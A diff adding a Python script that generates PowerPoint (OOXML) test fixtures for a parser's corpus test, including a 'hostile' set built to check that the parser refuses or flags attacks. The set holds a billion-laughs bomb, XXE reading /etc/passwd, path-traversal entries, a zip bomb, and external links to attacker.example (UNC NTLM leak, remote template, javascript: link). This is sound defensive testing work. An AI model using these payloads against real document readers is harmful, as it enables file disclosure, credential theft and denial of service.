@@ -1,0 +1,496 @@
+#!/usr/bin/env python3
+"""Generate the deterministic fixtures, and fixtures/manifest.tsv.
+
+Fixed timestamps and order, so a checksum changes only when a fixture does.
+
+Manifest columns: path, sha256, expectation. Expectation is `refuse:<code>`, or
+`open` plus any `<code>` findings the deck must produce, space-separated. The
+corpus test in crates/casual-slide-ooxml/tests/corpus.rs reads this file.
+
+    python3 fixtures/tools/generate.py          # write
+    python3 fixtures/tools/generate.py --check  # fail if a file differs from the manifest
+"""
+import hashlib
+import io
+import pathlib
+import sys
+import zipfile
+
+ROOT = pathlib.Path(__file__).resolve().parents[1]
+STAMP = (1980, 1, 1, 0, 0, 0)
+T = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+PKG_RELS = "http://schemas.openxmlformats.org/package/2006/relationships"
+PML = "application/vnd.openxmlformats-officedocument.presentationml"
+NS = ('xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
+      f'xmlns:r="{T}" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"')
+DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+
+
+def rels(*items):
+    out = [DECL, f'<Relationships xmlns="{PKG_RELS}">']
+    for i, (typ, target, *mode) in enumerate(items, 1):
+        full = typ if typ.startswith("http") else f"{T}/{typ}"
+        m = f' TargetMode="{mode[0]}"' if mode else ""
+        out.append(f'<Relationship Id="rId{i}" Type="{full}" Target="{target}"{m}/>')
+    out.append("</Relationships>")
+    return "".join(out)
+
+
+TREE = ('<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>')
+SCHEME = "".join(f'<a:{n}><a:srgbClr val="{v}"/></a:{n}>' for n, v in [
+    ("dk1", "000000"), ("lt1", "FFFFFF"), ("dk2", "44546A"), ("lt2", "E7E6E6"), ("accent1", "4472C4"),
+    ("accent2", "ED7D31"), ("accent3", "A5A5A5"), ("accent4", "FFC000"), ("accent5", "5B9BD5"),
+    ("accent6", "70AD47"), ("hlink", "0563C1"), ("folHlink", "954F72")])
+FILL = '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
+LINE = f'<a:ln w="6350">{FILL}</a:ln>'
+EFFECT = "<a:effectStyle><a:effectLst/></a:effectStyle>"
+THEME = (f'{DECL}<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Fixture">'
+         f'<a:themeElements><a:clrScheme name="Fixture">{SCHEME}</a:clrScheme>'
+         '<a:fontScheme name="Fixture"><a:majorFont><a:latin typeface="Arial"/><a:ea typeface=""/><a:cs typeface=""/></a:majorFont>'
+         '<a:minorFont><a:latin typeface="Arial"/><a:ea typeface=""/><a:cs typeface=""/></a:minorFont></a:fontScheme>'
+         f'<a:fmtScheme name="Fixture"><a:fillStyleLst>{FILL * 3}</a:fillStyleLst><a:lnStyleLst>{LINE * 3}</a:lnStyleLst>'
+         f'<a:effectStyleLst>{EFFECT * 3}</a:effectStyleLst><a:bgFillStyleLst>{FILL * 3}</a:bgFillStyleLst></a:fmtScheme>'
+         '</a:themeElements></a:theme>')
+CLRMAP = ('<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" '
+          'accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>')
+TITLE = ('<p:sp><p:nvSpPr><p:cNvPr id="2" name="Title 1"/><p:cNvSpPr/><p:nvPr><p:ph type="title"/></p:nvPr></p:nvSpPr>'
+         '<p:spPr><a:xfrm><a:off x="838200" y="365125"/><a:ext cx="10515600" cy="1325563"/></a:xfrm>'
+         '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr>'
+         '<p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="en-US"/><a:t>%s</a:t></a:r></a:p></p:txBody></p:sp>')
+
+
+def deck(slides=1, types_extra=(), slide_rels=(), presentation=None, root_extra=(), parts=(), main_type=None,
+         root_type="officeDocument", title="Fixture"):
+    """A minimal valid deck, as an ordered list of (name, bytes-or-str)."""
+    ids = "".join(f'<p:sldId id="{256 + i}" r:id="rId{i + 3}"/>' for i in range(slides))
+    pres = presentation or (f'{DECL}<p:presentation {NS}><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>'
+                            f'<p:sldIdLst>{ids}</p:sldIdLst><p:sldSz cx="12192000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/></p:presentation>')
+    over = [("/ppt/presentation.xml", main_type or f"{PML}.presentation.main+xml"),
+            ("/ppt/slideMasters/slideMaster1.xml", f"{PML}.slideMaster+xml"),
+            ("/ppt/slideLayouts/slideLayout1.xml", f"{PML}.slideLayout+xml"),
+            ("/ppt/theme/theme1.xml", "application/vnd.openxmlformats-officedocument.theme+xml")]
+    over += [(f"/ppt/slides/slide{i + 1}.xml", f"{PML}.slide+xml") for i in range(slides)]
+    ct = [DECL, '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">',
+          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>',
+          '<Default Extension="xml" ContentType="application/xml"/>',
+          '<Default Extension="png" ContentType="image/png"/>']
+    ct += [f'<Override PartName="{n}" ContentType="{t}"/>' for n, t in list(over) + list(types_extra)]
+    ct.append("</Types>")
+    out = [("[Content_Types].xml", "".join(ct)),
+           ("_rels/.rels", rels((root_type, "ppt/presentation.xml"), *root_extra)),
+           ("ppt/presentation.xml", pres),
+           ("ppt/_rels/presentation.xml.rels", rels(("slideMaster", "slideMasters/slideMaster1.xml"), ("theme", "theme/theme1.xml"),
+                                                    *[("slide", f"slides/slide{i + 1}.xml") for i in range(slides)])),
+           ("ppt/slideMasters/slideMaster1.xml",
+            f'{DECL}<p:sldMaster {NS}><p:cSld><p:spTree>{TREE}</p:spTree></p:cSld>{CLRMAP}'
+            '<p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst></p:sldMaster>'),
+           ("ppt/slideMasters/_rels/slideMaster1.xml.rels", rels(("slideLayout", "../slideLayouts/slideLayout1.xml"), ("theme", "../theme/theme1.xml"))),
+           ("ppt/slideLayouts/slideLayout1.xml",
+            f'{DECL}<p:sldLayout {NS} type="titleOnly"><p:cSld name="Title Only"><p:spTree>{TREE}{TITLE % "Layout"}</p:spTree></p:cSld></p:sldLayout>'),
+           ("ppt/slideLayouts/_rels/slideLayout1.xml.rels", rels(("slideMaster", "../slideMasters/slideMaster1.xml"))),
+           ("ppt/theme/theme1.xml", THEME)]
+    for i in range(slides):
+        out.append((f"ppt/slides/slide{i + 1}.xml",
+                    f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}{TITLE % f"{title} {i + 1}"}</p:spTree></p:cSld></p:sld>'))
+        out.append((f"ppt/slides/_rels/slide{i + 1}.xml.rels",
+                    rels(("slideLayout", "../slideLayouts/slideLayout1.xml"), *slide_rels)))
+    out += list(parts)
+    return out
+
+
+def zipped(entries, method=zipfile.ZIP_DEFLATED):
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", method) as z:
+        for name, data in entries:
+            info = zipfile.ZipInfo(name, STAMP)
+            info.compress_type = method
+            info.external_attr = 0
+            z.writestr(info, data.encode("utf8") if isinstance(data, str) else data)
+    return buf.getvalue()
+
+
+def replace(entries, name, data):
+    return [(n, data if n == name else d) for n, d in entries]
+
+
+def vba_deck():
+    entries = deck(main_type="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
+                   parts=[("ppt/vbaProject.bin", b"x")],
+                   types_extra=[("/ppt/vbaProject.bin", "application/vnd.ms-office.vbaProject")])
+    return zipped(replace(entries, "ppt/_rels/presentation.xml.rels", rels(
+        ("slideMaster", "slideMasters/slideMaster1.xml"), ("theme", "theme/theme1.xml"), ("slide", "slides/slide1.xml"),
+        ("http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin"))))
+
+
+def strict(entries):
+    """Transitional to Strict by namespace mapping alone. **Synthetic:** nothing here
+    was saved by PowerPoint, so it shows we follow the schema, not what Office writes."""
+    pairs = [(T, "http://purl.oclc.org/ooxml/officeDocument/relationships"),
+             ("http://schemas.openxmlformats.org/drawingml/2006/main", "http://purl.oclc.org/ooxml/drawingml/main"),
+             ("http://schemas.openxmlformats.org/presentationml/2006/main", "http://purl.oclc.org/ooxml/presentationml/main")]
+    out = []
+    for name, data in entries:
+        for transitional, mapped in pairs:
+            data = data.replace(transitional, mapped)
+        out.append((name, data))
+    return out
+
+
+def fixtures():
+    bomb_laughs = (f'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
+                   f'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><p:presentation {NS}>&c;</p:presentation>')
+    xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+    png = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360000002000001"
+                        "e221bc330000000049454e44ae426082")
+
+    yield "generated/minimal.pptx", zipped(deck()), "open"
+    yield "generated/three-slides.pptx", zipped(deck(3)), "open"
+    yield "generated/stored-not-deflated.pptx", zipped(deck(), zipfile.ZIP_STORED), "open"
+    yield "generated/image.pptx", zipped(deck(slide_rels=[("image", "../media/image1.png")], parts=[("ppt/media/image1.png", png)])), "open"
+    yield "generated/slideshow.ppsx", zipped(deck(main_type=f"{PML}.slideshow.main+xml")), "open"
+    yield "generated/template.potx", zipped(deck(main_type=f"{PML}.template.main+xml")), "open"
+    # UTF-16 is legal in OPC, and a reader that assumes UTF-8 sees garbage.
+    utf16 = deck()
+    utf16 = replace(utf16, "_rels/.rels", b"\xff\xfe" + rels(("officeDocument", "ppt/presentation.xml")).replace("UTF-8", "UTF-16").encode("utf-16-le"))
+    yield "generated/utf16-rels.pptx", zipped(utf16), "open"
+    # Relationships spelled in a different case from the entries.
+    cased = [(n.replace("ppt/slides/slide1", "ppt/Slides/Slide1"), d) for n, d in deck()]
+    yield "generated/case-differs.pptx", zipped(cased), "open"
+    from generate_presets import fixtures as preset_fixtures  # imports this module, so not at the top
+    yield from preset_fixtures()
+
+    # OPC-01: one part, spelled differently by its relationship and its ZIP item.
+    yield "generated/percent-encoded-names.pptx", zipped(deck(
+        slide_rels=[("image", "../media/my image.png"), ("image", "../media/é.png"), ("slide", "slide 2.xml")],
+        parts=[("ppt/media/my%20image.png", png), ("ppt/media/%C3%A9.png", png),
+               ("ppt/slides/slide%202.xml", f"{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}</p:spTree></p:cSld></p:sld>"),
+               ("ppt/slides/_rels/slide%202.xml.rels", rels(("image", "../media/my%20image.png")))])), "open"
+    yield "generated/percent-encoded-targets.pptx", zipped(deck(
+        slide_rels=[("image", "../media/my%20image.png"), ("image", "../media/%c3%a9.png")],
+        parts=[("ppt/media/my image.png", png), ("ppt/media/é.png", png)])), "open"
+    # MCE-01: a Choice this engine does not understand, in front of a valid Fallback.
+    mc_ns = ('xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" '
+             'xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" mc:Ignorable="p14"')
+    alternate = (f'<mc:AlternateContent><mc:Choice Requires="p14"><p14:notInAnySchema/></mc:Choice>'
+                 f'<mc:Fallback>{TITLE % "Fallback"}</mc:Fallback></mc:AlternateContent>')
+    yield "generated/mce-alternate-content.pptx", zipped(replace(deck(), "ppt/slides/slide1.xml",
+        f'{DECL}<p:sld {NS} {mc_ns}><p:cSld p14:ignored="1"><p:spTree>{TREE}{alternate}</p:spTree></p:cSld></p:sld>')), "open"
+    # STRICT-01: synthetic. The name says so, since no PowerPoint-saved Strict deck exists here yet.
+    yield "generated/strict-synthetic.pptx", zipped(strict(deck(2))), "open"
+
+    hostile = {
+        "doctype-billion-laughs": (zipped(replace(deck(), "ppt/presentation.xml", bomb_laughs)), "refuse:CS-XML-0005"),
+        "doctype-xxe-in-rels": (zipped(replace(deck(), "_rels/.rels", xxe + rels(("officeDocument", "ppt/presentation.xml")).replace(DECL, ""))), "refuse:CS-XML-0005"),
+        "doctype-xxe-in-content-types": (zipped(replace(deck(), "[Content_Types].xml", xxe + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')), "refuse:CS-XML-0005"),
+        "undeclared-entity": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}>&evil;</p:presentation>")), "refuse:CS-XML-0004"),
+        "deep-nesting": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}>" + "<a>" * 5000 + "</a>" * 5000 + "</p:presentation>")), "refuse:CS-XML-0002"),
+        "unclosed-element": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}><a>")), "refuse:CS-XML-0004"),
+        "two-roots": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}/><p:presentation {NS}/>")), "refuse:CS-XML-0004"),
+        "wrong-main-root": (zipped(replace(deck(), "ppt/presentation.xml", "<workbook/>")), "refuse:CS-XML-0004"),
+        "repeated-relationship-id": (zipped(replace(deck(), "_rels/.rels", rels(("officeDocument", "ppt/presentation.xml")).replace("</Relationships>", f'<Relationship Id="rId1" Type="{T}/slide" Target="x"/></Relationships>'))), "refuse:CS-XML-0004"),
+        "content-type-conflict": (zipped(replace(deck(), "[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="a/b"/><Default Extension="xml" ContentType="c/d"/></Types>')), "refuse:CS-XML-0004"),
+        "main-is-workbook": (zipped(deck(main_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")), "refuse:CS-OPC-0004"),
+        "no-content-types": (zipped([e for e in deck() if e[0] != "[Content_Types].xml"]), "refuse:CS-OPC-0001"),
+        "no-root-rels": (zipped([e for e in deck() if e[0] != "_rels/.rels"]), "refuse:CS-OPC-0001"),
+        "main-part-missing": (zipped([e for e in deck() if e[0] != "ppt/presentation.xml"]), "refuse:CS-OPC-0001"),
+        # A main relationship in a look-alike namespace must not be believed.
+        "spoofed-office-document-type": (zipped(deck(root_type="http://example.com/evil/officeDocument")), "refuse:CS-OPC-0001"),
+        "compound-file": (bytes.fromhex("d0cf11e0a1b11ae1") + b"\0" * 504, "refuse:CS-OPC-0005"),
+        "not-a-zip": (b"this is not a package", "refuse:CS-PKG-0005"),
+        "path-traversal": (zipped(deck(parts=[("../../etc/evil.xml", "<a/>")])), "refuse:CS-PKG-0004"),
+        "case-colliding-parts": (zipped(deck(parts=[("PPT/PRESENTATION.XML", "<a/>")])), "refuse:CS-PKG-0007"),
+        "zip-bomb": (zipped(deck(parts=[("ppt/media/bomb.bin", b"\0" * (64 << 20))])), "refuse:CS-PKG-0003"),
+        "percent-equivalent-parts": (zipped(deck(parts=[("ppt/media/a b.png", png), ("ppt/media/a%20b.png", b"other")])), "refuse:CS-PKG-0007"),
+        "mce-must-understand-unknown": (zipped(replace(deck(), "ppt/presentation.xml", f'{DECL}<p:presentation {NS} xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x="urn:unknown" mc:MustUnderstand="x"/>')), "refuse:CS-MCE-0001"),
+        "mce-nonconformant-main": (zipped(replace(deck(), "ppt/presentation.xml", f'{DECL}<p:presentation {NS} xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="undeclared"/>')), "open CS-FND-0012"),
+        "rel-percent-traversal": (zipped(deck(slide_rels=[("image", "../%2e%2e/%2e%2e/etc/passwd"), ("image", "..%2f..%2fetc%2fpasswd"), ("image", "%252e%252e/x.png"), ("image", "%c0%ae%c0%ae/x.png"), ("image", "..\\..\\x.png")])), "open CS-FND-0011"),
+        "part-name-undecodable": (zipped(deck(parts=[("ppt/media/%ff.png", png)])), "open CS-FND-0005 CS-FND-0011"),
+        # These open: nothing is followed, and the report names them.
+        "external-image-tracking": (zipped(deck(slide_rels=[("image", "https://tracker.example/pixel.png", "External")])), "open CS-FND-0001"),
+        "external-image-unc-ntlm": (zipped(deck(slide_rels=[("image", "\\\\attacker.example\\share\\a.png", "External")])), "open CS-FND-0001"),
+        "remote-template": (zipped(deck(slide_rels=[("attachedTemplate", "https://attacker.example/t.potx", "External")])), "open CS-FND-0001"),
+        "link-javascript": (zipped(deck(slide_rels=[("hyperlink", "java&#9;script:alert(1)", "External")])), "open CS-FND-0002"),
+        "link-unc": (zipped(deck(slide_rels=[("hyperlink", "\\\\attacker.example\\s", "External")])), "open CS-FND-0002"),
+        "rel-above-package-root": (zipped(deck(slide_rels=[("image", "../../../../etc/passwd")])), "open CS-FND-0003"),
+        "rel-dangling": (zipped(deck(slide_rels=[("image", "../media/none.png")])), "open CS-FND-0004"),
+        "rel-cycle": (zipped(deck(slide_rels=[("slide", "slide1.xml")])), "open"),
+        "orphan-part": (zipped(deck(parts=[("ppt/hidden/stash.xml", "<a/>")])), "open CS-FND-0005"),
+        "undeclared-type": (zipped(deck(parts=[("ppt/media/x.unknownext", b"x")], slide_rels=[("image", "../media/x.unknownext")])), "open CS-FND-0006"),
+        "unknown-rel-type": (zipped(deck(slide_rels=[("http://example.com/custom", "../media/none.png", "External")])), "open CS-FND-0001 CS-FND-0007"),
+        "embedded-object": (zipped(deck(slide_rels=[("oleObject", "../embeddings/o.bin")], parts=[("ppt/embeddings/o.bin", b"x")], types_extra=[("/ppt/embeddings/o.bin", "application/vnd.openxmlformats-officedocument.oleObject")])), "open CS-FND-0010"),
+        "vba-project": (vba_deck(), "open CS-FND-0008"),
+    }
+    for name, (data, expect) in hostile.items():
+        yield f"hostile/{name}.bin", data, expect
+    yield from property_fixtures()
+
+
+CORE_NS = ('xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
+           'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" '
+           'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"')
+EP_NS = ('xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" '
+         'xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"')
+CP_NS = ('xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" '
+         'xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"')
+FMTID = "{D5CDD505-2E9C-101B-9397-08002B2CF9AE}"
+CORE_REL = f"{PKG_RELS}/metadata/core-properties"
+PROP_TYPES = [("/docProps/core.xml", "application/vnd.openxmlformats-package.core-properties+xml"),
+              ("/docProps/app.xml", "application/vnd.openxmlformats-officedocument.extended-properties+xml"),
+              ("/docProps/custom.xml", "application/vnd.openxmlformats-officedocument.custom-properties+xml"),
+              ("/ppt/presProps.xml", f"{PML}.presProps+xml"),
+              ("/ppt/viewProps.xml", f"{PML}.viewProps+xml"),
+              ("/ppt/tags/tag1.xml", f"{PML}.tags+xml"),
+              ("/ppt/fonts/font1.fntdata", "application/x-fontdata"),
+              ("/customXml/item1.xml", "application/xml"),
+              ("/ppt/notesMasters/notesMaster1.xml", f"{PML}.notesMaster+xml"),
+              ("/ppt/handoutMasters/handoutMaster1.xml", f"{PML}.handoutMaster+xml"),
+              ("/ppt/pub.htm", "text/html")]
+TAGS = f'{DECL}<p:tagLst {NS}><p:tag name="K" val="V"/></p:tagLst>'
+
+
+def full_deck(presentation, core="", app="", custom="", pres_props="", view_props=""):
+    """Three slides, with whichever property parts are given, and a part behind every id
+    the rich presentation names. Relationship ids are fixed: see the list below."""
+    entries = deck(3, presentation=presentation, types_extra=PROP_TYPES, parts=[
+        ("ppt/presProps.xml", pres_props or f"{DECL}<p:presentationPr {NS}/>"),
+        ("ppt/viewProps.xml", view_props or f"{DECL}<p:viewPr {NS}/>"),
+        ("ppt/tags/tag1.xml", TAGS),
+        ("ppt/fonts/font1.fntdata", b"not a font"),
+        ("customXml/item1.xml", "<x/>"),
+        ("ppt/notesMasters/notesMaster1.xml", f"{DECL}<p:notesMaster {NS}/>"),
+        ("ppt/handoutMasters/handoutMaster1.xml", f"{DECL}<p:handoutMaster {NS}/>"),
+        ("ppt/pub.htm", b"<html/>"),
+        ("ppt/_rels/viewProps.xml.rels", rels(("slide", "slides/slide1.xml"))),
+        ("ppt/_rels/presProps.xml.rels", rels(("htmlPubSaveAs", "pub.htm"))),
+        ("docProps/core.xml", core or f"{DECL}<cp:coreProperties {CORE_NS}/>"),
+        ("docProps/app.xml", app or f"{DECL}<Properties {EP_NS}/>"),
+        ("docProps/custom.xml", custom or f"{DECL}<Properties {CP_NS}/>"),
+    ])
+    entries = replace(entries, "_rels/.rels", rels(("officeDocument", "ppt/presentation.xml"), (CORE_REL, "docProps/core.xml"),
+                                                  ("extended-properties", "docProps/app.xml"), ("custom-properties", "docProps/custom.xml")))
+    return replace(entries, "ppt/_rels/presentation.xml.rels", rels(
+        ("slideMaster", "slideMasters/slideMaster1.xml"), ("theme", "theme/theme1.xml"),  # rId1, rId2
+        ("slide", "slides/slide1.xml"), ("slide", "slides/slide2.xml"), ("slide", "slides/slide3.xml"),  # rId3-5
+        ("presProps", "presProps.xml"), ("viewProps", "viewProps.xml"),  # rId6, rId7
+        ("tags", "tags/tag1.xml"), ("font", "fonts/font1.fntdata"), ("customXml", "../customXml/item1.xml"),  # rId8-10
+        ("notesMaster", "notesMasters/notesMaster1.xml"), ("handoutMaster", "handoutMasters/handoutMaster1.xml")))  # rId11, rId12
+
+
+def pres_doc(body="", attrs=""):
+    return (f'{DECL}<p:presentation {NS}{attrs}><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>'
+            f'<p:sldIdLst><p:sldId id="256" r:id="rId3"/><p:sldId id="257" r:id="rId4"/><p:sldId id="258" r:id="rId5"/></p:sldIdLst>'
+            f'<p:sldSz cx="12192000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/>{body}</p:presentation>')
+
+
+def rich_parts():
+    """Every Tier 1A and 1B element at least once, with what a parser would lose: comments,
+    odd spacing and quoting, prefixes other than the usual, unknown extensions."""
+    presentation = (
+        f"{DECL}<!-- kept -->\n<p:presentation {NS} xmlns:x=\"urn:unknown\"  serverZoom='80%'\n firstSlideNum=\"5\" showSpecialPlsOnTitleSld=\"0\" rtl=\"false\" "
+        'removePersonalInfoOnSave="1" compatMode="0" strictFirstAndLastChars="1" embedTrueTypeFonts="1" saveSubsetFonts="1" '
+        'autoCompressPictures="0" bookmarkIdSeed="7" conformance="transitional" x:unknown="kept">\n'
+        '  <p:sldMasterIdLst>\n    <p:sldMasterId id="2147483648" r:id="rId1"/>\n  </p:sldMasterIdLst>\n'
+        '  <p:notesMasterIdLst><p:notesMasterId r:id="rId11"/></p:notesMasterIdLst>\n  <p:handoutMasterIdLst><p:handoutMasterId r:id="rId12"/></p:handoutMasterIdLst>\n'
+        '  <p:sldIdLst>\n    <p:sldId r:id="rId3" id="256"/>\n    <!-- between -->\n    <p:sldId id="257" r:id="rId4"><p:extLst><p:ext uri="{K}"><x:y/></p:ext></p:extLst></p:sldId>\n'
+        '    <p:sldId id="258" r:id="rId5"/>\n  </p:sldIdLst>\n'
+        '  <p:sldSz cx="12192000" cy="6858000" type="screen16x9"/>\n  <p:notesSz cx="6858000" cy="9144000"/>\n  <p:smartTags r:id="rId8"/>\n'
+        '  <p:embeddedFontLst><p:embeddedFont><p:font typeface="Fixture Sans" panose="020B0604020202020204" pitchFamily="34" charset="0"/>'
+        '<p:regular r:id="rId9"/></p:embeddedFont></p:embeddedFontLst>\n'
+        '  <p:custShowLst><p:custShow name="Short &amp; sweet" id="3"><p:sldLst><p:sld r:id="rId5"/><p:sld r:id="rId3"/></p:sldLst></p:custShow></p:custShowLst>\n'
+        '  <p:photoAlbum bw="1" showCaptions="0" layout="2pic" frame="frameStyle3"/>\n'
+        '  <p:custDataLst><p:custData r:id="rId10"/><p:tags r:id="rId8"/></p:custDataLst>\n'
+        '  <p:kinsoku lang="ja-JP" invalStChars="!)" invalEndChars="(["/>\n'
+        '  <p:defaultTextStyle><a:defPPr><a:defRPr lang="en-US"/></a:defPPr></p:defaultTextStyle>\n'
+        '  <p:modifyVerifier cryptProviderType="rsaAES" cryptAlgorithmClass="hash" cryptAlgorithmType="typeAny" cryptAlgorithmSid="14" spinCount="100000" saltData="AAAA" hashData="BBBB"/>\n'
+        '  <p:extLst><p:ext uri="{E}"><x:kept a="1"/></p:ext></p:extLst>\n</p:presentation>\n')
+    pres_props = (
+        f'{DECL}<p:presentationPr {NS}>\n  <p:htmlPubPr showSpeakerNotes="0" target="_blank" title="T" r:id="rId1"><p:sldAll/></p:htmlPubPr>\n  <p:webPr showAnimation="1" imgSz="1024x768" encoding="utf-8" clr="browser"/>\n'
+        '  <p:prnPr prnWhat="handouts6" clrMode="gray" hiddenSlides="1" scaleToFitPaper="1" frameSlides="1"/>\n'
+        '  <p:showPr loop="1" showNarration="1" showAnimation="0" useTimings="0"><p:kiosk restart="60000"/><p:custShow id="3"/>'
+        '<p:penClr><a:srgbClr val="FF0000"/></p:penClr></p:showPr>\n'
+        '  <p:clrMru><a:srgbClr val="00FF00"/></p:clrMru>\n  <p:extLst><p:ext uri="{P}"/></p:extLst>\n</p:presentationPr>\n')
+    common = ('<p:cViewPr varScale="1"><p:scale><a:sx n="88" d="100"/><a:sy n="89" d="100"/></p:scale>'
+              '<p:origin x="-1104" y="-90"/></p:cViewPr>')
+    slide_view = (f'<p:cSldViewPr snapToGrid="0" snapToObjects="1" showGuides="1">{common}'
+                  '<p:guideLst><p:guide orient="horz" pos="2160"/><p:guide pos="3840"/></p:guideLst></p:cSldViewPr>')
+    view_props = (
+        f'{DECL}<p:viewPr {NS} lastView="sldThumbnailView" showComments="0">\n'
+        '  <p:normalViewPr showOutlineIcons="0" snapVertSplitter="1" vertBarState="minimized" horzBarState="maximized" preferSingleView="1">'
+        '<p:restoredLeft sz="15620" autoAdjust="0"/><p:restoredTop sz="94660"/></p:normalViewPr>\n'
+        f'  <p:slideViewPr>{slide_view}</p:slideViewPr>\n'
+        f'  <p:outlineViewPr>{common}<p:sldLst><p:sld r:id="rId1" collapse="1"/></p:sldLst></p:outlineViewPr>\n'
+        f'  <p:notesTextViewPr>{common}</p:notesTextViewPr>\n'
+        f'  <p:sorterViewPr showFormatting="0">{common}</p:sorterViewPr>\n'
+        f'  <p:notesViewPr>{slide_view}</p:notesViewPr>\n'
+        '  <p:gridSpacing cx="76200" cy="76200"/>\n  <p:extLst><p:ext uri="{V}"/></p:extLst>\n</p:viewPr>\n')
+    core = (
+        f'{DECL}<cp:coreProperties {CORE_NS} xmlns:other="urn:other">\n  <dc:title>Old &amp; title</dc:title>\n  <dc:subject>Subject</dc:subject>\n'
+        '  <dc:creator>Author</dc:creator>\n  <cp:keywords xml:lang="en">one, two<cp:value xml:lang="de">drei</cp:value></cp:keywords>\n'
+        '  <dc:description>Words</dc:description>\n  <cp:lastModifiedBy>Editor</cp:lastModifiedBy>\n  <cp:revision>12</cp:revision>\n'
+        '  <dcterms:created xsi:type="dcterms:W3CDTF">2020-01-02T03:04:05Z</dcterms:created>\n'
+        '  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-02-03T04:05:06.5+05:30</dcterms:modified>\n'
+        '  <cp:lastPrinted>2019-12-31T23:59:59Z</cp:lastPrinted>\n  <cp:category>Cat</cp:category>\n  <cp:contentStatus>Draft</cp:contentStatus>\n'
+        '  <dc:identifier>urn:x</dc:identifier>\n  <dc:language>en-GB</dc:language>\n  <cp:version>1.2</cp:version>\n'
+        '  <other:title>not the title</other:title>\n</cp:coreProperties>\n')
+    app = (
+        f'{DECL}<Properties {EP_NS}>\n  <TotalTime>14</TotalTime>\n  <Words>120</Words>\n  <Application>Fixture</Application>\n'
+        '  <PresentationFormat>Widescreen</PresentationFormat>\n  <Paragraphs>9</Paragraphs>\n  <Slides>3</Slides>\n  <Notes>1</Notes>\n'
+        '  <HiddenSlides>0</HiddenSlides>\n  <MMClips>0</MMClips>\n  <ScaleCrop>false</ScaleCrop>\n'
+        '  <HeadingPairs><vt:vector size="2" baseType="variant"><vt:variant><vt:lpstr>Slide Titles</vt:lpstr></vt:variant><vt:variant><vt:i4>1</vt:i4></vt:variant></vt:vector></HeadingPairs>\n'
+        '  <TitlesOfParts><vt:vector size="1" baseType="lpstr"><vt:lpstr>One</vt:lpstr></vt:vector></TitlesOfParts>\n'
+        '  <Company>Co &amp; Co</Company>\n  <Manager>M</Manager>\n  <Template>T.potx</Template>\n  <Pages>0</Pages>\n  <Characters>5</Characters>\n'
+        '  <Lines>2</Lines>\n  <LinksUpToDate>0</LinksUpToDate>\n  <CharactersWithSpaces>6</CharactersWithSpaces>\n  <SharedDoc>0</SharedDoc>\n'
+        '  <HyperlinkBase>https://example.com/</HyperlinkBase>\n'
+        '  <HLinks><vt:vector size="1" baseType="variant"><vt:variant><vt:i4>2</vt:i4></vt:variant></vt:vector></HLinks>\n'
+        '  <HyperlinksChanged>0</HyperlinksChanged>\n  <DigSig><vt:blob>QUJD</vt:blob></DigSig>\n  <AppVersion>16.0000</AppVersion>\n  <DocSecurity>0</DocSecurity>\n</Properties>\n')
+    values = [("lpwstr", "text"), ("i1", "-1"), ("i2", "-2"), ("i4", "-4"), ("i8", "-8"), ("int", "7"), ("ui1", "1"), ("ui2", "2"), ("ui4", "4"),
